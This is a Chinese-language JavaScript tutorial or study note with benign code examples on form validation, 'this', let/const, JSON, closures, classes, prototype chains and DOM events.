分析：var x=document.forms[&quot;myForm&quot;][&quot;fname&quot;].value;：在函数内部，通过 document.forms[&quot;myForm&quot;][&quot;fname&quot;] 获取了表单中名为 “fname” 的输入框，并使用 .value 获取了该输入框的值，将其赋给变量 x。
return false;：返回 false，表示表单验证失败，阻止表单的提交（如果删除这行代码，则可以报错，但表单会继续提交）
E-mail验证
&lt;script&gt;function validateForm()&#123;	var x=document.forms[&quot;myForm&quot;][&quot;email&quot;].value;	var atpos=x.indexOf(&quot;@&quot;);	var dotpos=x.lastIndexOf(&quot;.&quot;);	if (atpos&lt;1 || dotpos&lt;atpos+2 || dotpos+2&gt;=x.length)&#123;		alert(&quot;不是一个有效的 e-mail 地址&quot;);  		return false;	&#125;&#125;&lt;/script&gt;&lt;form name=&quot;myForm&quot; action=&quot;demo-form.php&quot; onsubmit=&quot;return validateForm();&quot; method=&quot;post&quot;&gt;Email: &lt;input type=&quot;text&quot; name=&quot;email&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;

验证API约束验证DOM方法



属性
描述



checkValidity()
如果 input 元素中的数据是合法的返回 true，否则返回 false。


setCustomValidity()
设置 input 元素的 validationMessage 属性，用于自定义错误提示信息的方法。使用 setCustomValidity 设置了自定义提示后，validity.customError 就会变成 true，checkValidity 总是会返回 false。如果要重新判断需要取消自定义提示，方式如下：setCustomValidity(&#39;&#39;)  setCustomValidity(null)  setCustomValidity(undefined)


&lt;body&gt;&lt;p&gt;输入数字并点击验证按钮:&lt;/p&gt;&lt;input id=&quot;id1&quot; type=&quot;number&quot; min=&quot;100&quot; max=&quot;300&quot; required&gt;&lt;button onclick=&quot;myFunction()&quot;&gt;验证&lt;/button&gt;&lt;p&gt;如果输入的数字小于 100 或大于300，会提示错误信息。&lt;/p&gt;&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;&lt;script&gt;function myFunction() &#123;    var inpObj = document.getElementById(&quot;id1&quot;);    if (inpObj.checkValidity() == false) &#123;        document.getElementById(&quot;demo&quot;).innerHTML = inpObj.validationMessage;    &#125; else &#123;        document.getElementById(&quot;demo&quot;).innerHTML = &quot;输入正确&quot;;    &#125;&#125;&lt;/script&gt;&lt;/body&gt;

validationMessage 属性会返回一个包含了关于输入框验证失败的错误消息的字符串
约束验证DOM属性



属性
描述



validity
布尔属性值，返回 input 输入值是否合法


validationMessage
浏览器错误提示信息


willValidate
指定 input 是否需要验证


Validity属性



属性
描述



customError
设置为 true, 如果设置了自定义的 validity 信息。


patternMismatch
设置为 true, 如果元素的值不匹配它的模式属性。


rangeOverflow
设置为 true, 如果元素的值大于设置的最大值。


rangeUnderflow
设置为 true, 如果元素的值小于它的最小值。


stepMismatch
设置为 true, 如果元素的值不是按照规定的 step 属性设置。


tooLong
设置为 true, 如果元素的值超过了 maxLength 属性设置的长度。


typeMismatch
设置为 true, 如果元素的值不是预期相匹配的类型。


valueMissing
设置为 true，如果元素 (required 属性) 没有值。


valid
设置为 true，如果元素的值是合法的。


来个实例：
function myFunction() &#123;    var txt = &quot;&quot;;    if (document.getElementById(&quot;id1&quot;).validity.rangeOverflow) &#123;       txt = &quot;输入的值太大了&quot;;    &#125;    document.getElementById(&quot;demo&quot;).innerHTML = txt;&#125;

this关键字 this 不是固定不变的，它会随着执行环境的改变而改变。

在方法中，this 表示该方法所属的对象。（在 JavaScript 中，对象的属性可以是函数，这种属性称为方法）
如果单独使用，this 表示全局对象。
在函数中，this 表示全局对象。
在函数中，在严格模式下，this 是未定义的(undefined)。
在事件中，this 表示接收事件的元素。
类似 call() 和 apply() 方法可以将 this 引用到任何对象。

方法中的this
var person=&#123;    firstname:&quot;Sherlock&quot;,    Lastname:&quot;Holmes&quot;,    id:5566,    fullname:function()&#123;      return this.firstname+&quot; &quot;+this.Lastname;    &#125;  &#125;;  document.getElementById(&quot;demo&quot;).innerHTML=person.fullname();

fullName 方法所属的对象就是 person
想要使用这个方法时，需要在方法名后面加上一对括号 ()，这样 JavaScript 就知道你是在调用这个方法。如果不加括号，那么 person.fullname 将被视为一个函数对象，而不是调用该函数,那么页面中相应元素的内容将会是 function()，表示这个属性是一个函数
单独使用this
var x = this;document.getElementById(&quot;demo&quot;).innerHTML = x;//返回的结果是：[object Window]

在浏览器中，window 就是该全局对象
函数中的this
//&quot;use strict&quot;;document.getElementById(&quot;demo&quot;).innerHTML = myFunction();function myFunction() &#123;  return this;&#125;

函数的所属者默认绑定到 this 上，在浏览器中，window 就是该全局对象为 [object Window]
严格模式下，即在有第一行代码的情况下函数是没有绑定到 this 上，这时候 this 是 undefined，这是因为严格模式下不允许默认绑定
事件中的this
&lt;body&gt;&lt;button onclick=&quot;this.style.display=&#x27;none&#x27;&quot;&gt;点我后我就消失了&lt;/button&gt;&lt;/body&gt;

this 关键字代表当前触发了事件的元素，也就是按钮本身。this.style.display=&#39;none&#39; 表示设置按钮的 display 属性为 &#39;none&#39;，这样按钮就不会显示在页面上了
显式函数绑定
在 JavaScript 中函数也是对象，对象则有方法，apply 和 call 就是函数对象的方法。这两个方法异常强大，他们允许切换函数执行的上下文环境（context），即 this 绑定的对象
var person1 = &#123;  fullName: function() &#123;    return this.firstName + &quot; &quot; + this.lastName;  &#125;&#125;var person2 = &#123;  firstName:&quot;John&quot;,  lastName: &quot;Doe&quot;,&#125;var x = person1.fullName.call(person2); document.getElementById(&quot;demo&quot;).innerHTML = x; 

使用 person2 作为参数来调用 person1.fullName 方法时, this 将指向 person2, 即便它是 person1 的方法
let和constlet 声明的变量只在 let 命令所在的代码块内有效。
const 声明一个只读的常量，声明时必须进行初始化，一旦声明，常量的值就不能改变。
let 声明的变量只在 let 命令所在的代码块 {} 内有效，在 {} 之外不能访问
&#123;     let x = 2;&#125;// 这里不能使用 x 变量

在相同的作用域或块级作用域中，不能使用 let 关键字来重置 var 关键字声明的变量,，同样不能使用 var 关键字来重置 let 关键字声明的变量。（就是哪个关键字先声明变量就是合法的）
var x = 2;       // 合法let x = 3;       // 不合法&#123;    var x = 4;   // 合法    let x = 5   // 不合法&#125;

const 的本质: const 定义的变量并非常量，并非不可变，它定义了一个常量引用一个值。使用 const 定义的对象或者数组，其实是可变的，也就是说我们可以修改其对象或者数组里面的元素，但是不能对该对象或者数组进行重新赋值，因为这样的话内存地址会发生变化，这是不允许的
const car = &#123;type:&quot;Fiat&quot;, model:&quot;500&quot;, color:&quot;white&quot;&#125;;car = &#123;type:&quot;Volvo&quot;, model:&quot;EX60&quot;, color:&quot;red&quot;&#125;;    // 错误car.color = &quot;red&quot;;car.owner = &quot;Johnson&quot;；document.getElementById(&quot;demo&quot;).innerHTML = &quot;Car owner is &quot; + car.owner;

在相同的作用域或块级作用域中，不能使用 const 关键字来重置 const 关键字声明的变量
const 关键字在不同作用域，或不同块级作用域中是可以重新声明赋值的
JSON以下 JSON 语法定义了 sites 对象: 3 条网站信息（对象）的数组:
&#123;&quot;sites&quot;:[    &#123;&quot;name&quot;:&quot;Runoob&quot;, &quot;url&quot;:&quot;www.runoob.com&quot;&#125;,     &#123;&quot;name&quot;:&quot;Google&quot;, &quot;url&quot;:&quot;www.google.com&quot;&#125;,    &#123;&quot;name&quot;:&quot;Taobao&quot;, &quot;url&quot;:&quot;www.taobao.com&quot;&#125;]&#125;

JSON格式化后为JavaScript对象
语法规则：

数据为 键&#x2F;值 对。
数据由逗号分隔。
大括号保存对象
方括号保存数组

JSON 字符串转换为 JavaScript 对象
var text = &#x27;&#123; &quot;sites&quot; : [&#x27; +	&#x27;&#123; &quot;name&quot;:&quot;Runoob&quot; , &quot;url&quot;:&quot;www.runoob.com&quot; &#125;,&#x27; +	&#x27;&#123; &quot;name&quot;:&quot;Google&quot; , &quot;url&quot;:&quot;www.google.com&quot; &#125;,&#x27; +	&#x27;&#123; &quot;name&quot;:&quot;Taobao&quot; , &quot;url&quot;:&quot;www.taobao.com&quot; &#125; ]&#125;&#x27;;	obj = JSON.parse(text);document.getElementById(&quot;demo&quot;).innerHTML = obj.sites[1].name + &quot; &quot; + obj.sites[1]

首先，创建 JavaScript 字符串，字符串为 JSON 格式的数据；然后，使用 JavaScript 内置函数 JSON.parse() 将字符串转换为 JavaScript 对象；最后，在你的页面中使用新的 JavaScript 对象



函数
描述



JSON.parse()
用于将一个 JSON 字符串转换为 JavaScript 对象。


JSON.stringify()
用于将 JavaScript 值转换为 JSON 字符串


voidvoid主要的就是防止页面跳转
javascript:void(0)
语法格式如下：
void(func())javascript:void(func())

实例如下：
&lt;body&gt;    &lt;a href=&quot;javascript:void(0)&quot;&gt;单击此处什么也不会发生&lt;/a&gt;&lt;/body&gt;

当用户链接时，void(0) 计算为 0，但 Javascript 上没有任何效果。

&lt;body&gt;&lt;p&gt;点击以下链接查看结果：&lt;/p&gt;&lt;a href=&quot;javascript:void(alert(&#x27;Warning!!!&#x27;))&quot;&gt;点我!&lt;/a&gt;&lt;/body&gt;

void()仅仅是代表不返回任何值，但是括号内的表达式还是要运行
href&#x3D;”#”
# 包含了一个位置信息，默认的锚是**#top** 也就是网页的上端。
而javascript:void(0), 仅仅表示一个死链接。
在页面很长的时候会使用 # 来定位页面的具体位置，格式为：**# + id**
&lt;a href=&quot;javascript:void(0);&quot;&gt;点我没有反应的!&lt;/a&gt;&lt;a href=&quot;#pos&quot;&gt;点我定位到指定位置!&lt;/a&gt;&lt;br&gt;...&lt;br&gt;&lt;p id=&quot;pos&quot;&gt;尾部定位点&lt;/p&gt;

异步编程（回调函数）同步按你的代码顺序执行，异步不按照代码顺序执行，异步的执行效率更高。
通俗地解释一下就是从主线程发射一个子线程来完成任务
什么时候使用异步编程
在前端编程中（甚至后端有时也是这样），我们在处理一些简短、快速的操作时，例如计算 1 + 1 的结果，往往在主线程中就可以完成。主线程作为一个线程，不能够同时接受多方面的请求。所以，当一个事件没有结束时，界面将无法处理其他请求。
现在有一个按钮，如果我们设置它的 onclick 事件为一个死循环，那么当这个按钮按下，整个网页将失去响应。
为了避免这种情况的发生，我们常常用子线程来完成一些可能消耗时间足够长以至于被用户察觉的事情，比如读取一个大文件或者发出一个网络请求。因为子线程独立于主线程，所以即使出现阻塞也不会影响主线程的运行。但是子线程有一个局限：一旦发射了以后就会与主线程失去同步，我们无法确定它的结束，如果结束之后需要处理一些事情，比如处理来自服务器的信息，我们是无法将它合并到主线程中去的。
为了解决这个问题，JavaScript 中的异步操作函数往往通过回调函数来实现异步任务的结果处理。
回调函数
回调函数就是一个函数，它是在我们启动一个异步任务的时候就告诉它：等你完成了这个任务之后要干什么
&lt;script&gt;  setTimeout(function()&#123;    document.getElementById(&quot;demo&quot;).innerHTML=&quot;Messi!&quot;;  &#125;,3000);&lt;/script&gt;

setTimeout 函数是 JavaScript 中的一个定时器函数，用于在一定的时间延迟后执行指定的代码或函数；基础语法如下：
setTimeout(function, milliseconds);

其中function 是要执行的函数或代码块；milliseconds 是延迟的毫秒数
由于setTimeout是在子线程中执行的，主线程没有停止，在主线程里面可以执行其他函数
&lt;script&gt;  setTimeout(function()&#123;    document.getElementById(&quot;demo&quot;).innerHTML=&quot;Messi!&quot;;//子线程  &#125;,3000);  document.getElementById(&quot;demo2&quot;).innerHTML=&quot;MCI!&quot;;//主线程&lt;/script&gt;

HTML载入外部JavaScript文件&lt;script src=&quot;myscript.js&quot;&gt;

JS函数函数定义函数表达式存储在变量后，变量也可作为一个函数使用
&lt;script&gt;var x = function (a, b) &#123;return a * b&#125;;document.getElementById(&quot;demo&quot;).innerHTML = x(4, 3);&lt;/script&gt;

函数存储在变量中，不需要函数名称，通常通过变量名来调用，上述函数以分号结尾是因为它是一个执行语句
自调用函数
自调用函数是指在定义后立即执行的 JavaScript 函数，语法格式如下：
(function() &#123;  // 在这里编写函数体&#125;)();

实例如下：
&lt;script&gt;(function () &#123;    document.getElementById(&quot;demo&quot;).innerHTML = &quot;Hello! 我是自己调用的&quot;;&#125;)();&lt;/script&gt;


在JavaScript中把函数描述为对象更加的准确一点，这里的函数也有属性和方法
例子：arguments.length 属性返回函数调用过程接收到的参数个数
&lt;script&gt;function myFunction(a, b) &#123;    return arguments.length;&#125;document.getElementById(&quot;demo&quot;).innerHTML = myFunction(4, 3);&lt;/script&gt;

toString() 方法将函数作为一个字符串返回
&lt;script&gt;function myFunction(a, b) &#123;    return a * b;&#125;document.getElementById(&quot;demo&quot;).innerHTML = myFunction.toString();&lt;/script&gt;

箭头函数
箭头函数的表达式更加的简洁，语法如下：
(参数1, 参数2, …, 参数N) =&gt; &#123; 函数声明 &#125;(参数1, 参数2, …, 参数N) =&gt; 表达式(单一)// 相当于：(参数1, 参数2, …, 参数N) =&gt;&#123; return 表达式; &#125;

当只有一个函数时，圆括号是可加可不加的
(单一参数) =&gt; &#123;函数声明&#125;单一参数 =&gt; &#123;函数声明&#125;

没有参数的函数圆括号不能省略：() =&gt; &#123;函数声明&#125;
例子如下：
&lt;script&gt;const x = (x, y) =&gt; x * y;document.getElementById(&quot;demo&quot;).innerHTML = x(5, 5);&lt;/script&gt;

函数参数显式参数和隐式参数
函数显式参数在函数定义时列出；隐式参数在函数调用时传递给函数真正的值。
ES5 中如果函数在调用时未提供隐式参数，参数会默认设置为： undefined
解释：y=y||0，如果 y 已经定义，y || 0 返回 y，因为 y 是 true，否则返回 0，因为 undefined 为 false。
ES6 支持函数带有默认参数
function myFunction(x, y = 10) &#123;    // y is 10 if not passed or undefined    return x + y;&#125;myFunction(0, 2) // 输出 2myFunction(5); // 输出 15, y 参数的默认值

arguments对象
JavaScript 函数有个内置的对象 arguments 对象，它包含了函数调用的参数数组。
通过这种方式你可以很方便的找到最大的一个参数的值
&lt;script&gt;x = findMax(1, 123, 500, 115, 44, 88);function findMax() &#123;    var i, max = arguments[0];        if(arguments.length &lt; 2) return max;     for (i = 0; i &lt; arguments.length; i++) &#123;        if (arguments[i] &gt; max) &#123;            max = arguments[i];        &#125;    &#125;    return max;&#125;document.getElementById(&quot;demo&quot;).innerHTML = x;&lt;/script&gt;

函数调用使用构造函数调用函数
如果函数调用前使用了 new 关键字, 则是调用了构造函数。
这看起来就像创建了新的函数，但实际上 JavaScript 函数是重新创建的对象
&lt;script&gt;function myFunction(arg1, arg2) &#123;	this.firstName = arg1;    this.lastName  = arg2;&#125;var x = new myFunction(&quot;John&quot;,&quot;Doe&quot;)document.getElementById(&quot;demo&quot;).innerHTML = x.firstName; &lt;/script&gt;

myFunction是构造函数，构造函数的调用会创建一个新的对象。新对象会继承构造函数的属性和方法
构造函数中 this 关键字没有任何的值。this 的值在函数调用实例化对象(new object)时创建。
作为函数方法调用函数
前文中的this关键字一节中也有提到过
call() 和 apply() 是预定义的函数方法。 两个方法可用于调用函数，两个方法的第一个参数必须是对象本身。
&lt;script&gt;var myObject;function myFunction(a, b) &#123;    return a * b;&#125;myObject = myFunction.call(myObject, 10, 2);    // 返回 20document.getElementById(&quot;demo&quot;).innerHTML = myObject; &lt;/script&gt;

闭包变量声明时如果不使用 var 关键字，那么它就是一个全局变量，即便它在函数内定义。
在 JavaScript 中，函数可以访问其定义时所在的作用域中的变量。当一个函数在另一个函数内部被定义时，它可以访问包含它的外部函数的作用域，形成了闭包
闭包是指一个函数和其周围的状态的组合。这个环境包含了函数创建时所处的作用域中的所有局部变量，以及它们的值。这意味着函数可以访问其外部作用域中定义的变量，即使在它被调用时，这些变量已经不再处于活动状态。
闭包通常由以下两个特点组成：

内部函数引用外部变量：闭包函数内部定义的函数引用了外部函数的局部变量。
外部函数返回内部函数：外部函数返回了内部定义的函数，使得该函数的作用域仍然可以访问外部函数中的变量。

我们可以使用自调用函数来实现闭包
&lt;script&gt;  var add=(function()&#123;    var counter=0;    return function()&#123;return counter +=1;&#125;  &#125;)();  function myFunction()&#123;    document.getElementById(&quot;demo&quot;).innerHTML=add();  &#125;&lt;/script&gt;

对上述代码的解释：var add = (function() &#123; ... &#125;)();：这是一个立即执行函数表达式（Immediately Invoked Function Expression，IIFE）。这个函数返回了一个内部函数，并将这个内部函数赋值给变量 add。在这个内部函数内部，创建了一个私有变量 counter，并返回一个闭包函数，这个闭包函数用来递增 counter 的值
 counter 是一个闭包变量，它被包含在返回的匿名函数内部，并且由于闭包的特性，该变量在函数执行完毕后并不会被销毁，而是会一直保存在内存中，直到程序退出或者手动释放，因此，每次调用 add 函数时，实际上是在调用返回的闭包函数，这个闭包函数中的 counter 变量会保留之前的值，并在每次调用时进行累加操作
也可以这样说，counter 变量是在外部函数作用域中定义的，即 IIFE 的作用域。而内部函数（闭包函数）保留了对这个作用域的引用，因此它可以在每次调用时访问和修改 counter 变量的值
类类的基础使用 class 关键字来创建一个类，类体在一对大括号 {} 中，我们可以在大括号 {} 中定义类成员的位置，如方法或构造函数。
每个类中包含了一个特殊的方法 **constructor()**，它是类的构造函数，这种方法用于创建和初始化一个由 class 创建的对象。
创建一个类的语法格式如下：
class ClassName &#123;  constructor() &#123; ... &#125;&#125;

在定义好类之后，我们可以使用 new关键字来创建对象：
&lt;script&gt;  class MNC&#123;    constructor(name,captain)&#123;      this.name=name;      this.captain=captain;    &#125;  &#125;  let site=new MNC(&quot;MNC&quot;,&quot;鲁本&quot;);  document.getElementById(&quot;demo&quot;).innerHTML=site.name+&quot;: &quot;+site.captain;&lt;/script&gt;

创建对象时会自动调用构造函数方法 constructor()
类表达式
类表达式是定义类的另一种方法。类表达式可以命名或不命名。命名类表达式的名称是该类体的局部名称。
实例：
// 未命名/匿名类let Runoob = class &#123;  constructor(name, url) &#123;    this.name = name;    this.url = url;  &#125;&#125;;console.log(Runoob.name);// output: &quot;Runoob&quot; // 命名类let Runoob = class Runoob2 &#123;  constructor(name, url) &#123;    this.name = name;    this.url = url;  &#125;&#125;;console.log(Runoob.name);// 输出: &quot;Runoob2&quot;

构造方法
构造方法是一种特殊的方法：

构造方法名为 constructor()。
构造方法在创建新对象时会自动执行。
构造方法用于初始化对象属性。
如果不定义构造方法，JavaScript 会自动添加一个空的构造方法。

类的方法
使用关键字 class 创建一个类，可以添加一个 constructor() 方法，然后添加任意数量的方法
&lt;script&gt;  class King&#123;    constructor(name,year) &#123;      this.name=name;      this.year=year;    &#125;    age()&#123;      let date=new Date();      return date.getFullYear()-this.year;    &#125;  &#125;  let king=new King(&quot;Messi&quot;,2022);  document.getElementById(&quot;demo&quot;).innerHTML=&quot;Messi is the king for &quot;+king.age()+&quot; years.&quot;;&lt;/script&gt;

也可以向类的方法发送参数
&lt;script&gt;class Runoob &#123;  constructor(name, year) &#123;    this.name = name;    this.year = year;  &#125;  age(x) &#123;    return x - this.year;  &#125;&#125;let date = new Date();let year = date.getFullYear();let runoob = new Runoob(&quot;菜鸟教程&quot;, 2020);document.getElementById(&quot;demo&quot;).innerHTML=&quot;菜鸟教程 &quot; + runoob.age(year) + &quot; 岁了。&quot;;&lt;/script&gt;

类关键字



关键字
描述



extends
继承一个类


static
在类中定义一个静态方法


super
调用父类的构造方法


类继承使用ES6类继承
JavaScript 类继承使用 extends 关键字。
继承允许我们依据另一个类来定义一个类，这使得创建和维护一个应用程序变得更容易。
super() 方法用于调用父类的构造函数。
当创建一个类时，您不需要重新编写新的数据成员和成员函数，只需指定新建的类继承了一个已有的类的成员即可。这个已有的类称为基类（父类），新建的类称为派生类（子类）。
继承代表了 is a 关系。例如，哺乳动物是动物，狗是哺乳动物，因此，狗是动物，等等。
&lt;script&gt;  class Who &#123;    constructor(name) &#123;      this.name = name;    &#125;    present()&#123;      return &#x27;我喜欢&#x27; + this.name;    &#125;  &#125;  class King extends Who&#123;    constructor(name,age)&#123;      super(name);      this.age=age;    &#125;    show()&#123;      return this.present()+&#x27;，他成为球王&#x27;+this.age+&#x27;年了。&#x27;;    &#125;  &#125;  let king=new King(&quot;梅西&quot;,2);  document.getElementById(&quot;demo&quot;).innerHTML=king.show();&lt;/script&gt;

super() 方法引用父类的构造方法。
通过在构造方法中调用 super() 方法，我们调用了父类的构造方法，这样就可以访问父类的属性和方法。
使用原型链继承
详情见下一节
getter和setter
类中我们可以使用 getter 和 setter 来获取和设置值，getter 和 setter 都需要在严格模式下执行。
类中添加 getter 和 setter 使用的是 get 和 set 关键字，实例如下：
&lt;script&gt;class Runoob &#123;  constructor(name) &#123;    this._sitename = name;  &#125;  get sitename() &#123;    return this._sitename;  &#125;  set sitename(x) &#123;    this._sitename = x;  &#125;&#125;let noob = new Runoob(&quot;菜鸟教程&quot;);document.getElementById(&quot;demo&quot;).innerHTML = noob.sitename;&lt;/script&gt;

getter&#x2F;setter 方法的名称不能与属性的名称相同，很多开发者在属性名称前使用下划线字符 _ 将 getter&#x2F;setter 与实际属性分开
静态方法静态方法是使用 static 关键字修饰的方法，又叫类方法，属于类的，但不属于对象，在实例化对象之前可以通过 类名.方法名 调用静态方法。静态方法不能在对象上调用，只能在类中调用。
如果想在对象中使用静态方法，可以把对象作为一个参数传递给它：
&lt;script&gt;class Runoob &#123;  constructor(name) &#123;    this.name = name;  &#125;  static hello(x) &#123;    return &quot;Hello &quot; + x.name;  &#125;&#125;let noob = new Runoob(&quot;菜鸟教程&quot;);document.getElementById(&quot;demo&quot;).innerHTML = Runoob.hello(noob);&lt;/script&gt;

原型链构造函数
实例如下
function Person(name, age) &#123;    this.name = name;    this.age = age;&#125;

原型对象
JS的每个函数在创建的时候，都会生成一个属性prototype，这个属性指向一个对象，这个对象就是此函数的原型对象。该原型对象中有个属性为constructor，指向该函数。这样原型对象和它的函数之间就产生了联系。

**_proto_**
每个通过构造函数创建出来的实例对象，其本身有个属性__proto__，这个属性会指向该实例对象的构造函数的原型对象

当访问一个对象的某个属性时，会先在这个对象本身属性上查找，如果没有找到，则会通过它的__proto__隐式属性，找到它的构造函数的原型对象，如果还没有找到就会再在其构造函数的prototype的__proto__中查找，这样一层一层向上查找就会形成一个链式结构，我们称为原型链
注意：如果通过p1实例对象的__proto__属性赋值，则会改变其构造函数的原型对象，从而被所有实例所共享。
// 构造函数   function Preson(name, age) &#123;     this.name = name;     this.age = age;   &#125;   // 所有实例共享的公共方法   Preson.prototype.say = function (word) &#123;     console.log(`$&#123;this.name&#125;说：$&#123;word&#125;`);   &#125;   const p1 = new Preson(&#x27;张三&#x27;, 18); // 创建一个Person实例对象   const p2 = new Preson(&#x27;李四&#x27;, 20); // 新创建一个Proson实例对象   p1.say(&#x27;hello world&#x27;); // 调用公共方法   p1.hasOwnProperty(&#x27;say&#x27;) // false 说明不是定义在其本身上的   p1.__proto__.do = function () &#123;     console.log(&#x27;往原型对象中添加方法&#x27;);   &#125;   p2.do(); // 打印出了-往原型对象中添加方法

原型链的尽头
构造函数，通过打印它的prototype属性，可以发现它有个__proto__属性指向了一个Object对象该对象的构造函数为function Object，我们由此可以得知，所有的原型对象的__proto__属性都是指向function Object的原型对象。 而function Object的原型对象在上图中我们可以得知是不存在__proto__这个属性的，它指向了null。我们就得知了原型链的尽头是null。


当你创建一个自定义的函数时（比如 Animal 函数），JavaScript 会自动为这个函数创建一个 prototype 对象。你可以通过给这个 prototype 对象添加属性和方法来定义该函数的原型，从而实现函数的原型继承。
function Animal(name) &#123;  this.name = name;&#125;//构造函数Animal.prototype.eat = function() &#123;  console.log(this.name + &quot; is eating.&quot;);&#125;;function Dog(name, breed) &#123;  Animal.call(this, name);  this.breed = breed;&#125;//构造函数// 建立原型链，让 Dog 继承 AnimalDog.prototype = Object.create(Animal.prototype);Dog.prototype.constructor = Dog;Dog.prototype.bark = function() &#123;  console.log(this.name + &quot; is barking.&quot;);&#125;;var dog = new Dog(&quot;Buddy&quot;, &quot;Labrador&quot;);dog.eat();  // 调用从 Animal 继承的方法dog.bark(); // 调用 Dog 的方法

在 Dog 的构造函数中，我们使用 Animal.call(this, name) 来调用父类 Animal 的构造函数，确保了在创建 Dog 实例时能够正确初始化 name 属性
Dog.prototype = Object.create(Animal.prototype);：，通过 Object.create(Animal.prototype) 将 Dog 的原型对象指向了 Animal 的原型对象，从而实现了 Dog 对象对 Animal 对象的继承。
Object.create() 是 JavaScript 中用来创建一个新对象，并将新对象的原型设置为指定的原型对象的函数。它的语法结构如下：
Object.create(proto[, propertiesObject])

其中，proto 参数是新对象的原型对象，而 propertiesObject 是可选的，用于定义新对象的可枚举属性。这个方法返回一个新对象，该对象的原型为指定的 proto 参数。
使用 Object.create() 可以很方便地创建一个继承自指定原型对象的新对象。在上面提到的代码示例中，就是利用 Object.create() 来建立了 Dog 对象对 Animal 对象的原型继承关系。

相关链接：一文搞懂JS原型与原型链（超详细，建议收藏） - 掘金 (juejin.cn)
HTML DOM (文档对象模型)查找HTML元素1.通过 id 找到 HTML 元素：var x=document.getElementById(&quot;intro&quot;);
2.通过标签名找到 HTML 元素
&lt;body&gt;&lt;p&gt;你好世界!&lt;/p&gt;&lt;div id=&quot;main&quot;&gt;&lt;p&gt; DOM 是非常有用的。&lt;/p&gt;&lt;p&gt;该实例展示了  &lt;b&gt;getElementsByTagName&lt;/b&gt; 方法&lt;/p&gt;&lt;/div&gt;&lt;script&gt;var x=document.getElementById(&quot;main&quot;);var y=x.getElementsByTagName(&quot;p&quot;);document.write(&#x27;id=&quot;main&quot;元素中的第一个段落为：&#x27; + y[0].innerHTML);&lt;/script&gt;&lt;/body&gt;

3.通过类名找到 HTML 元素：var x=document.getElementsByClassName(&quot;intro&quot;);
改变HTML改变 HTML 元素的内容，请使用这个语法：document.getElementById(*id*).innerHTML=新的 HTML
改变 HTML 元素的属性，请使用这个语法：document.getElementById(*id*).*attribute=新属性值，例子如下
&lt;body&gt;&lt;img id=&quot;image&quot; src=&quot;smiley.gif&quot; width=&quot;160&quot; height=&quot;120&quot;&gt;&lt;script&gt;document.getElementById(&quot;image&quot;).src=&quot;landscape.jpg&quot;;&lt;/script&gt;&lt;p&gt;原图片为 smiley.gif,脚本将图片修改为 landscape.jpg&lt;/p&gt;&lt;/body&gt;

DOM事件HTML 事件的例子：

当用户点击鼠标时
当网页已加载时
当图像已加载时
当鼠标移动到元素上时
当输入字段被改变时
当提交 HTML 表单时
当用户触发按键时

onload 和 onunload 事件
onload 和 onunload 事件会在用户进入或离开页面时被触发。
onload 事件可用于检测访问者的浏览器类型和浏览器版本，并基于这些信息来加载网页的正确版本。
onload 和 onunload 事件可用于处理 cookie
&lt;body onload=&quot;checkCookies()&quot;&gt;&lt;script&gt;function checkCookies()&#123;	if (navigator.cookieEnabled==true)&#123;		alert(&quot;Cookies 可用&quot;)	&#125;	else&#123;		alert(&quot;Cookies 不可用&quot;)	&#125;&#125;&lt;/script&gt;//弹窗-提示浏览器 cookie 是否可用&lt;/body&gt;

onchange 事件
onchange 事件是在 HTML 元素的值发生改变时触发的事件。这个事件通常用于表单元素，比如 &lt;input&gt;、&lt;select&gt;、&lt;textarea&gt; 等，当用户在这些元素上进行修改后，就会触发 onchange 事件
&lt;h1&gt;开始测试&lt;/h1&gt;输入字母：&lt;input type=&quot;text&quot; id=&quot;demo&quot; onchange=&quot;myFunction()&quot;&gt;&lt;script&gt;  function myFunction()&#123;    var x=document.getElementById(&quot;demo&quot;);    x.value=x.value.toUpperCase();  &#125;&lt;/script&gt;//焦点离开输入框后，函数就会被触发

onmouseover 和 onmouseout 事件
onmouseover 和 onmouseout 事件可用于在用户的鼠标移至 HTML 元素上方或移出元素时触发函数。
&lt;div onmouseover=&quot;mOver(this)&quot; onmouseout=&quot;mOut(this)&quot; style=&quot;background-color:#D94A38;width:120px;height:20px;padding:40px;&quot;&gt;Mouse Over Me&lt;/div&gt;&lt;script&gt;function mOver(obj)&#123;	obj.innerHTML=&quot;Thank You&quot;&#125;function mOut(obj)&#123;	obj.innerHTML=&quot;Mouse Over Me&quot;&#125;&lt;/script&gt;

onmousedown, onmouseup 以及 onclick事件
onmousedown, onmouseup 以及 onclick 构成了鼠标点击事件的所有部分。首先当点击鼠标按钮时，会触发 onmousedown 事件，当释放鼠标按钮时，会触发 onmouseup 事件，最后，当完成鼠标点击时，会触发 onclick 事件
&lt;body&gt;&lt;script&gt;function lighton()&#123;	document.getElementById(&#x27;myimage&#x27;).src=&quot;bulbon.gif&quot;;&#125;function lightoff()&#123;	document.getElementById(&#x27;myimage&#x27;).src=&quot;bulboff.gif&quot;;&#125;&lt;/script&gt;&lt;img id=&quot;myimage&quot; onmousedown=&quot;lighton()&quot; onmouseup=&quot;lightoff()&quot; src=&quot;bulboff.gif&quot; width=&quot;100&quot; height=&quot;180&quot; /&gt;&lt;p&gt;点击不释放鼠标灯将一直亮着!&lt;/p&gt;&lt;/body&gt;

onfocus事件
&lt;body&gt;&lt;script&gt;function myFunction(x)&#123;	x.style.background=&quot;yellow&quot;;&#125;&lt;/script&gt;输入你的名字: &lt;input type=&quot;text&quot; onfocus=&quot;myFunction(this)&quot;&gt;&lt;p&gt;当输入框获取焦点时，修改背景色（background-color属性） 将被触发。&lt;/p&gt;&lt;/body&gt;

DOM EventListeneraddEventListener() 方法
addEventListener() 方法用于向指定元素添加事件句柄。
addEventListener() 方法添加的事件句柄不会覆盖已存在的事件句柄。
你可以向一个元素添加多个事件句柄。
你可以向同个元素添加多个同类型的事件句柄，如：两个 “click” 事件。
你可以向任何 DOM 对象添加事件监听，不仅仅是 HTML 元素。如： window 对象。
addEventListener() 方法可以更简单的控制事件（冒泡与捕获）。
下面实例为点击按钮后触发监听事件：
&lt;button id=&quot;muBtn&quot;&gt;点击&lt;/button&gt;&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;&lt;script&gt;  document.getElementById(&quot;muBtn&quot;).addEventListener(&quot;click&quot;,showDate);  function showDate()&#123;    document.getElementById(&quot;demo&quot;).innerHTML=Date();  &#125;&lt;/script&gt;

该方法的语法：element.addEventListener(event, function, useCapture);
